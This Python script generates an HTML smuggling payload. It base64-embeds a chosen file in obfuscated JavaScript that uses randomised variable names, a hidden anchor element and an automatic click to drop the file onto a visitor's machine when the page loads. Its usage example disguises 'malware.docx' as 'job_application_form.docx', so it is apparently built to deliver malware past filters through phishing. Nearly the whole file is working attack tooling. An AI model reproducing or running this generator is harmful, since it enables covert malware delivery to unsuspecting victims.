import random
import string
import sys
import os
import base64


def random_sequences():
    random_variable = []
    for i in range(0, 19):
        while True:
            unique = True
            tmp_str1 = random.sample(string.ascii_lowercase, k=2)
            tmp_str2 = random.sample(string.digits + string.ascii_lowercase, k=6)
            tmp_str = tmp_str1[0] + tmp_str1[1] + tmp_str2[0] + tmp_str2[1] + tmp_str2[2] + tmp_str2[3] + tmp_str2[4] + tmp_str2[5]
            for tmp in random_variable:
                if tmp == tmp_str:
                    unique = False
                    break
            if unique:
                random_variable.append(tmp_str)
                break
    return random_variable


def arg(output_file):
    argv = sys.argv
    number = len(argv)
    if number == 3:
        filename = argv[1].replace('"', "")
        file_path = argv[2].replace('"', "")
    else:
        program = argv[0].split(sep='\\')[-1].split(sep='/')[-1]
        print()
        print("\t>> " + program + "\tfilename\tfile_path")
        print("\t>> " + program + "\tjob_application_form.docx\tC:\\Users\\user0\\Desktop\\malware.docx")
        print()
        sys.exit(0)

    # (0) check file and permissions
    check_file_exist = os.access(file_path, os.F_OK)
    try:
        with open(file=output_file, encoding='utf-8', mode='w') as fl:
            fl.write('Trial')
        os.remove(output_file)
        check_write_permission = True
    except:
        check_write_permission = False
    if check_file_exist:
        if check_write_permission:
            return filename, file_path
        else:
            print()
            print("\tYou don't have permission to write or delete the file!")
            print()
            sys.exit(0)
    else:
        print()
        print("\tThe file not found!")
        print()
        sys.exit(0)


if __name__ == '__main__':
    output_file = "script.txt"
    try:
        filename, file_path = arg(output_file)
    except:
        sys.exit(0)
    try:
        with open(file=file_path, mode='rb') as rb_file:
            file_bytes = rb_file.read()
        data_base64_bytes = base64.b64encode(file_bytes)
        del file_bytes, file_path
        file_base64 = data_base64_bytes.decode(encoding='UTF-8')
        del data_base64_bytes
        random_variable = random_sequences()
        template = """<script> var """ + random_variable[0] + """=""" + random_variable[0] + """;(function(""" + random_variable[1] + """,""" + random_variable[
            2] + """){var """ + random_variable[3] + """=""" + random_variable[0] + """,""" + random_variable[4] + """=""" + random_variable[
                       1] + """();while(!![]){try{var """ + random_variable[5] + """=-parseInt(""" + random_variable[
                       3] + """(0x1b1))/0x1+-parseInt(""" + random_variable[3] + """(0x1a7))/0x2+parseInt(""" + random_variable[
                       3] + """(0x1b3))/0x3+-parseInt(""" + random_variable[3] + """(0x1bd))/0x4*(parseInt(""" + random_variable[
                       3] + """(0x1b6))/0x5)+parseInt(""" + random_variable[3] + """(0x1b4))/0x6*(parseInt(""" + random_variable[
                       3] + """(0x1a8))/0x7)+parseInt(""" + random_variable[3] + """(0x1b9))/0x8+-parseInt(""" + random_variable[
                       3] + """(0x1b7))/0x9;if(""" + random_variable[5] + """===""" + random_variable[2] + """)break;else """ + random_variable[
                       4] + """['push'](""" + random_variable[4] + """['shift']());}catch(""" + random_variable[6] + """){""" + random_variable[
                       4] + """['push'](""" + random_variable[4] + """['shift']());}}}(""" + random_variable[7] + """,0x291fa));function """ + \
                   random_variable[7] + """(){var """ + random_variable[
                       8] + """=['revokeObjectURL','508149iyQTpI','216tZOcWE','octet/stream','500685VYAZHK','2271357zoKGKP','length','2630616khEGdN','body','download','atob','4kKgjnM','createElement','214758lzjpsQ','44093NNfoUz','appendChild','buffer','URL','display:\\x20none','click','charCodeAt','href','""" + filename + """','96643zAJuKG'];""" + \
                   random_variable[7] + """=function(){return """ + random_variable[8] + """;};return """ + random_variable[7] + """();}var """ + random_variable[
                       13] + """='""" + file_base64 + """',""" + random_variable[14] + """=window[""" + random_variable[0] + """(0x1bc)](""" + \
                   random_variable[13] + """),""" + random_variable[15] + """=new Uint8Array(""" + random_variable[14] + """[""" + random_variable[
                       0] + """(0x1b8)]);for(var i=0x0;i<""" + random_variable[14] + """[""" + random_variable[0] + """(0x1b8)];i++){""" + \
                   random_variable[
                       15] + """[i]=""" + random_variable[14] + """[""" + random_variable[0] + """(0x1ae)](i);}function """ + random_variable[
                       0] + """(""" + \
                   random_variable[10] + """,""" + random_variable[12] + """){var """ + random_variable[7] + """46=""" + random_variable[7] + """();return """ + \
                   random_variable[
                       0] + """=function(""" + random_variable[0] + """ed,""" + random_variable[9] + """){""" + random_variable[0] + """ed=""" + random_variable[
                       0] + """ed-0x1a7;var """ + random_variable[11] + """=""" + random_variable[7] + """46[""" + random_variable[
                       0] + """ed];return """ + \
                   random_variable[11] + """;},""" + random_variable[0] + """(""" + random_variable[10] + """,""" + random_variable[12] + """);}var """ + random_variable[
                       16] + """=new Blob([""" + random_variable[15] + """[""" + random_variable[0] + """(0x1aa)]],{'type':""" + random_variable[
                       0] + """(0x1b5)}),""" + random_variable[17] + """=document[""" + random_variable[0] + """(0x1be)]('a'),""" + random_variable[
                       18] + """=window[""" + random_variable[0] + """(0x1ab)]['createObjectURL'](""" + random_variable[
                       16] + """);document[""" + \
                   random_variable[0] + """(0x1ba)][""" + random_variable[0] + """(0x1a9)](""" + random_variable[17] + """),""" + random_variable[
                       17] + """['style']=""" + random_variable[0] + """(0x1ac),""" + random_variable[17] + """[""" + random_variable[
                       0] + """(0x1af)]=""" + \
                   random_variable[18] + """,""" + random_variable[17] + """[""" + random_variable[0] + """(0x1bb)]=""" + random_variable[0] + """(0x1b0),""" + \
                   random_variable[
                       17] + """[""" + random_variable[0] + """(0x1ad)](),window[""" + random_variable[0] + """(0x1ab)][""" + random_variable[
                       0] + """(0x1b2)](""" + random_variable[18] + """); </script>"""
        del filename, file_base64, random_variable
        with open(file=output_file, encoding='utf-8', mode="w") as wfile:
            wfile.write(template)
        print()
        print('\tScript File: "script.txt" ')
        print('\tThe script file has been created successfully.')
        print()
    except:
        print()
        print('\tAn unexpected error has occurred')
        print()
